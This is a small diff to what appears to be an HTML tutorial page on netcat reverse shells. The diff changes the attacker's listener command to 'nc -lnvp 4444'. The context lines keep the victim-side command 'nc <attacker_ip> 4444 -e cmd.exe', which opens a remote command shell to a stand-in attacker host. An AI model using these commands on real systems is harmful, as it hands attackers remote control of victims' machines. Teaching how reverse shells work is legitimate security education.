@@ -2,7 +2,7 @@
 <img src="https://via.placeholder.com/600x300" alt="Netcat Example" class="img-fluid mb-3">
 
 <p>First we need to set up the listener on the attacker machine:</p>
-<pre><code>nc -lvp 4444</code></pre>
+<pre><code>nc -lnvp 4444</code></pre>
 
 <p>Next, we need to connect to the listener from the victim machine:</p>
 <pre><code>nc &lt;attacker_ip&gt; 4444 -e cmd.exe</code></pre>
